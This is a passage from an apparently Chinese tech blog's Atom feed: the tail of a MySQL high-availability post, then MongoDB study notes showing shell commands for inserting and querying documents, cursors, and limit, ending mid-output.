&#x62E5;&#x6709;&#x5E9E;&#x5927;&#x7684;&#x7528;&#x6237;&#x7FA4;,&#x56FD;&#x5916;&#x7684;&#x6709; Facebook&#x3001;Flickr&#x3001;eBay &#x7B49;,&#x56FD;&#x5185;&#x7684;&#x6709;&#x963F;&#x91CC;&#x3001;&#x817E;&#x8BAF;&#x3001;&#x65B0;&#x6D6A;&#x3001;&#x767E;&#x5EA6;&#x7B49;&#x3002;&#x800C;&#x8FD9;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x548C;&#x5927;&#x90E8;&#x5206;&#x4F20;&#x7EDF;&#x516C;&#x53F8;&#x7684;&#x670D;&#x52A1;&#x9700;&#x8981;7&#xD7;24&#x5C0F;&#x65F6;&#x8FDE;&#x7EED;&#x5DE5;&#x4F5C;&#x3002;&#x5F53;&#x6B64;&#x7C7B;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x90E8;&#x5206;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x5C31;&#x9700;&#x8981;&#x9AD8;&#x53EF;&#x7528;&#x6280;&#x672F;&#x5C06;&#x6D41;&#x91CF;&#x7275;&#x5F15;&#x81F3;&#x5907;&#x4EFD;&#x4E3B;&#x673A;,&#x4ECE;&#x800C;&#x6B64;&#x65F6;&#x8FD9;&#x4E9B;&#x516C;&#x53F8;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5907;&#x4EFD;&#x548C;&#x6062;&#x590D;&#x624B;&#x6BB5;&#x6765;&#x4EA7;&#x751F;&#x5907;&#x673A;,&#x5E76;&#x901A;&#x8FC7;&#x590D;&#x5236;&#x6765;&#x540C;&#x6B65;&#x4E3B;&#x5907;&#x673A;&#x95F4;&#x7684;&#x72B6;&#x6001;,&#x540C;&#x65F6;&#x90E8;&#x7F72;&#x5404;&#x79CD;&#x76D1;&#x63A7;&#x8F6F;&#x4EF6;&#x6765;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x72B6;&#x6001;&#x3002;&#x5F53;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x65F6;,&#x901A;&#x8FC7;&#x624B;&#x5DE5;&#x6216;&#x81EA;&#x52A8;&#x5316;&#x624B;&#x6BB5;&#x5C06;&#x4E3B;&#x673A;&#x6D41;&#x91CF;&#x5207;&#x6362;&#x81F3;&#x5907;&#x673A;,&#x8FD9;&#x4E2A;&#x52A8;&#x4F5C;&#x53EB;&#x4F5C;failover&#x3002;&#x800C;&#x4E00;&#x4E9B;&#x5927;&#x578B;&#x516C;&#x53F8;&#x5728;&#x9762;&#x5BF9;&#x6210;&#x5343;&#x4E0A;&#x4E07;&#x53F0; MySQL &#x670D;&#x52A1;&#x5668;&#x65F6;,&#x901A;&#x5E38;&#x4F7F;&#x7528;<code>&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x811A;&#x672C;</code>&#x6216;&#x7A0B;&#x5E8F;&#x5B8C;&#x6210;&#x4E0A;&#x8FF0;&#x79CD;&#x79CD;&#x52A8;&#x4F5C;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x4E00;&amp;#x3001;SQL&amp;#x8BED;&amp;#x53E5;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#x3001;SQL&amp;#x8BED;&amp;#x53E5;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x4E00;&amp;#x3001;SQL&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB学习笔记</title>
    <link href="https://marnm.github.io//posts/a36562d7/"/>
    <id>https://marnm.github.io//posts/a36562d7/</id>
    <published>2022-06-07T04:43:09.000Z</published>
    <updated>2022-06-07T05:17:01.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"><a href="#&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;"></a>&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;</h2><pre><code># mongoMongoDB shell version v3.6.13connecting to: test&gt; </code></pre><p>&#x9ED8;&#x8BA4;shell&#x8FDE;&#x63A5;&#x7684;&#x662F;&#x672C;&#x673A;localhost&#xFF0C;<code>nonnecting to:</code>&#x663E;&#x793A;&#x4F60;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#xFF0C;&#x2019;test&#x2019;&#x662F;MongoDB&#x7684;&#x9ED8;&#x8BA4;&#x5E93;&#xFF0C;&#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>use &apos;dbName&apos;</code>&#x547D;&#x4EE4;</p><h2 id="&#x63D2;&#x5165;&#x8BB0;&#x5F55;"><a href="#&#x63D2;&#x5165;&#x8BB0;&#x5F55;" class="headerlink" title="&#x63D2;&#x5165;&#x8BB0;&#x5F55;"></a>&#x63D2;&#x5165;&#x8BB0;&#x5F55;</h2><pre><code>&gt; j = {name:&quot;mongo&quot;};{ &quot;name&quot; : &quot;mongo&quot; }&gt; t={x:3}{ &quot;x&quot; : 3 }&gt; db.things.save(j)WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.things.save(t)WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.things.find(){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }</code></pre><ul><li>&#x4E0D;&#x9700;&#x8981;&#x9884;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#xFF0C;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#x5019;&#x4F1A;&#x81EA;&#x52A8;&#x521B;&#x5EFA;.</li><li>&#x5728;&#x6587;&#x6863;&#x6C47;&#x603B;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x4EFB;&#x4F55;&#x7ED3;&#x6784;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x7136;&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x6211;&#x4EEC;&#x5B58;&#x50A8;&#x7684;&#x8FD8;&#x662F;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#x6587;&#x6863;&#x7684;&#x96C6;&#x5408;</li><li>&#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x96C6;&#x5408;&#x4E2D;&#x90FD;&#x4F1A;&#x6709; &#x4E00;&#x4E2A;ID&#xFF0C;&#x540D;&#x5B57;&#x53EB;<code>_id</code>.</li></ul><p><strong>&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x63D2;&#x5165;</strong></p><pre><code class="js">&gt; for(var i=1;i&lt;=10;i++)db.c2.insert({name:&quot;user&quot;+i, age:18+i})WriteResult({ &quot;nInserted&quot; : 1 })&gt; db.c2.find(){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;), &quot;name&quot; : &quot;user3&quot;, &quot;age&quot; : 21 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;), &quot;name&quot; : &quot;user5&quot;, &quot;age&quot; : 23 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;), &quot;name&quot; : &quot;user9&quot;, &quot;age&quot; : 27 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28 }&gt;</code></pre><h2 id="id-key"><a href="#id-key" class="headerlink" title="_id key"></a><code>_id</code> key</h2><p>MongoDB&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E2D;&#xFF0C;<code>_id</code>&#x662F;&#x5176;&#x81EA;&#x6709;&#x4EA7;&#x7269;&#x3002;</p><p>&#x5B58;&#x50A8;&#x5728;MongoDB&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x6587;&#x6863;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x7684;<strong>&#x4E3B;&#x952E;</strong> <code>_id</code> &#xFF0C; &#x8FD9;&#x4E2A;&#x4E3B;&#x952E;&#x540D;&#x79F0;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x662F;MongoDB&#x652F;&#x6301;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;<code>ObjectId</code>&#x3002;</p><p>_id key &#x4E3E;&#x4F8B;&#x8BF4;&#x660E;</p><pre><code> db.test.find(){ &quot;_id&quot; : ObjectId(&quot;627d3ef6de66cb02cb45d3e1&quot;), &quot;name&quot; : &quot;zhangya&quot;, &quot;age&quot; : &quot;21&quot;, &quot;addr&quot; : &quot;&#x5317;&#x4EAC;&#x5E02;&#x671D;&#x9633;&#x533A;&quot; }{ &quot;_id&quot; : ObjectId(&quot;627d3fffde66cb02cb45d3e2&quot;), &quot;name&quot; : &quot;zhang3&quot;, &quot;age&quot; : &quot;24&quot;, &quot;addr&quot; : &quot;&#x4E0A;&#x6D77;&#x6D66;&#x4E1C;&#x533A;&quot; }&gt;</code></pre><p>&#x5728;MongoDB&#x4E2D;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x90FD;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x53EB;&#x505A;<strong>_id</strong>&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5B57;&#x6BB5;&#x7684;&#x9ED8;&#x8BA4;&#x7C7B;&#x578B;&#x662F;ObjectId&#xFF0C;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x5B57;&#x6BB5;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;ObjectId&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p><code>db.collection.insert</code></p><pre><code class="js">&gt; db.things.insert({_id:3,name:&quot;Bill&quot;,age:34})&gt; db.things.find(){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }</code></pre><p>&#xFF01;&#x867D;&#x7136;<strong>_id</strong> &#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x6307;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x4E2D;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5982;&#x679C;&#x63D2;&#x5165;&#x91CD;&#x590D;&#x503C;&#x7684;&#x8BDD;&#x7CFB;&#x7EDF;&#x5C06;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;</p><p><code>db.collection.insertOne()</code></p><pre><code class="js">&gt; db.test.insertOne({name:&quot;fnaichu&quot;, age: 24}){        &quot;acknowledged&quot; : true,        &quot;insertedId&quot; : ObjectId(&quot;627f80462c1c696497b0e31e&quot;)}&gt; </code></pre><p><code>db.collection.insertMany()</code></p><pre><code class="js">&gt; db.test.insertMany([... {name:&quot;li4&quot;, age: 35, addr:&quot;&#x5E7F;&#x5DDE;&#x5E02;&quot;},... {name:&quot;wang5&quot;, age: 42, addr:&quot;&#x5357;&#x4EAC;&#x5E02;&quot;},... {name:&quot;qiang7&quot;, age: 28, addr:&quot;&#x4E0A;&#x6D77;&#x5E02;&quot;}]){        &quot;acknowledged&quot; : true,        &quot;insertedIds&quot; : [                ObjectId(&quot;627f82648f2637720618c4f4&quot;),                ObjectId(&quot;627f82648f2637720618c4f5&quot;),                ObjectId(&quot;627f82648f2637720618c4f6&quot;)        ]}&gt; </code></pre><hr><h2 id="&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;"><a href="#&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;" class="headerlink" title="&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;"></a>&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;</h2><h3 id="&#x666E;&#x901A;&#x67E5;&#x8BE2;"><a href="#&#x666E;&#x901A;&#x67E5;&#x8BE2;" class="headerlink" title="&#x666E;&#x901A;&#x67E5;&#x8BE2;"></a>&#x666E;&#x901A;&#x67E5;&#x8BE2;</h3><p>&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x901A;&#x8FC7;<code>find()</code>&#x6765;&#x67E5;&#x8BE2;&#xFF0C;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x7ED3;&#x6784;&#x7684;&#x96C6;&#x5408;</p><pre><code class="js">&gt; var cursor=db.things.find()&gt; while(cursor.hasNext()) printjson(cursor.next()){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt;</code></pre><p>&#x4E0A;&#x9762;&#x4F8B;&#x5B50;&#x663E;&#x793A;&#x4E86;&#x6E38;&#x6807;&#x98CE;&#x683C;&#x7684;&#x8FED;&#x4EE3;&#x8F93;&#x51FA;&#x3002;<code>hasNext()</code>&#x51FD;&#x6570;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x8FD8;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5219;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>next()</code>&#x51FD;&#x6570;.</p><p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x662F;JavaScript shell&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x5230;JS&#x7684;&#x7279;&#x6027;&#xFF0C;forEach&#x5C31;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x6E38;&#x6807;&#x4E86;&#xFF0C;&#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x4F7F;&#x7528;forEach()&#x6765;&#x5FAA;&#x73AF;&#x8F93;&#x51FA;&#x7684;: forEach()&#x5FC5;&#x987B;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4F9B;&#x6BCF;&#x4E2A;&#x6E38;&#x6807;&#x5143;&#x7D20;&#x8C03;&#x7528;&#xFF1A;</p><pre><code class="js">&gt; db.things.find().forEach(printjson){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt;</code></pre><p>&#x5728;MongoDB shell&#x91CC;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x628A;&#x6E38;&#x6807;&#x5F53;&#x4F5C;&#x6570;&#x7EC4;&#x6765;&#x7528;&#xFF1A;</p><pre><code class="js">var cursor=db.things.find()&gt; printjson(cursor[1]){ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }&gt; printjson(cursor[2]){ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }&gt; printjson(cursor[0]){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt; printjson(cursor[12])undefined</code></pre><p>&#x4F7F;&#x7528;&#x6E38;&#x6807;&#x7684;&#x65F6;&#x5019;&#x8BF7;&#x6CE8;&#x610F;&#x5360;&#x7528;&#x5185;&#x5B58;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5F88;&#x5927;&#x7684;&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#x3002;&#x6240;&#x4EE5;&#x5E94;&#x8BE5;&#x7528;&#x8FED;&#x4EE3;&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x51FA;&#x3002;&#x628A;&#x6E38;&#x6807;&#x8F6C;&#x6362;&#x6210;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x7EC4;&#x7C7B;&#x578B;&#xFF1A;</p><pre><code class="js">&gt; var arr=db.things.find().toArray()&gt; arr[0]{ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt; arr[11]{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt; arr[12]&gt;</code></pre><p>&#x8BF7;&#x6CE8;&#x610F;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x77E5;&#x8BC6;&#x5728;MongoDB shell&#x91CC;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x90FD;&#x652F;&#x6301;&#x3002;MongoDB&#x6E38;&#x6807;&#x5BF9;&#x8C61;&#x4E0D;&#x662F;&#x6CA1;&#x6709;&#x5FEB;&#x7167;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x5728;&#x96C6;&#x5408;&#x91CC;&#x7B2C;&#x4E00;&#x6B21;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x8C03;&#x7528;<code>next()</code>&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x5F97;&#x4E0D;&#x5230;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x8981;&#x660E;&#x786E;&#x7684;&#x9501;&#x5B9A;&#x4F60;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x6E38;&#x6807;&#x3002;</p><h3 id="&#x6761;&#x4EF6;&#x67E5;&#x8BE2;"><a href="#&#x6761;&#x4EF6;&#x67E5;&#x8BE2;" class="headerlink" title="&#x6761;&#x4EF6;&#x67E5;&#x8BE2;"></a>&#x6761;&#x4EF6;&#x67E5;&#x8BE2;</h3><p>&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;SQL&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x662F;&#x600E;&#x4E48;&#x5728;MongoDB&#x91CC;&#x5B9E;&#x73B0;&#x7684;&#xFF1F;&#x8FD9;&#x91CC;&#x662F;&#x5728;MongoDB shell&#x91CC;&#x67E5;&#x8BE2;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5176;&#x4ED6;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9A71;&#x52A8;&#x6216;&#x8005;&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;&#xFF1A;<br>| |<br>| &#x2014; |<br>| <strong>SQL&#xFF1A;</strong> |<br>| SELECT * FROM things WHERE name=&#x201D;mongo&#x201D;; |<br>| <strong>MongoDB&#xFF1A;</strong> |<br>| db.things.find({name:&#x201D;mongo&#x201D;}).forEach(printjson) |</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><strong>SQL&#xFF1A;</strong></td></tr><tr><td>SELECT * FROM things WHERE x=4;</td></tr><tr><td><strong>MongoDB&#xFF1A;</strong></td></tr><tr><td>db.things.find({x:4}).forEach(printjson)</td></tr></tbody></table><p>&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x65F6;<code>{a:A, b:B}</code>&#x7C7B;&#x4F3C;&#x4E8E;<code>where a==A and b==B and ...</code></p><p>&#x4E0A;&#x9762;&#x663E;&#x793A;&#x7684;&#x662F;&#x6240;&#x6709;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x7279;&#x5B9A;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x8FD4;&#x56DE;&#x8868;&#x91CC;&#x7684;&#x67D0;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;find({x:4})&#x91CC;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x7684;&#x540D;&#x5B57;</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><strong>SQL&#xFF1A;</strong></td></tr><tr><td>SELECT j FROM things WHERE x=4</td></tr><tr><td><strong>MongoDB&#xFF1A;</strong></td></tr><tr><td>db.things.find({x:4},{j:true})</td></tr></tbody></table><h3 id="findOne"><a href="#findOne" class="headerlink" title="findOne()"></a><code>findOne()</code></h3><p>&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8003;&#x8651;&#xFF0C;MongoDB shell&#x907F;&#x514D;&#x6E38;&#x6807;&#x53EF;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;<code>findOne()</code>&#x51FD;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x548C;find()&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x8FC7;&#x5B83;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6E38;&#x6807;&#x91CC;&#x7684;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5185;&#x5BB9;&#x5219;&#x8FD4;&#x56DE;null&#x503C;&#x3002;</p><pre><code class="sql">&gt; printjson(db.things.findOne({name:&quot;mongo&quot;})){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }&gt;</code></pre><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a><code>limit</code></h3><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x9650;&#x5236;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>limit</code>&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x662F;&#x5F3A;&#x70C8;&#x63A8;&#x8350;&#x89E3;&#x51B3;&#x6027;&#x80FD;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x9650;&#x5236;&#x6761;&#x6570;&#x6765;&#x51CF;&#x5C11;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#xFF0C;&#x4F8B;&#x5982;</p><pre><code class="js">&gt; db.things.find().limit(4){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mongo&quot; }{ &quot;_id&quot; : ObjectId(&quot;627e7e124b7e83be0e107f69&quot;), &quot;x&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : 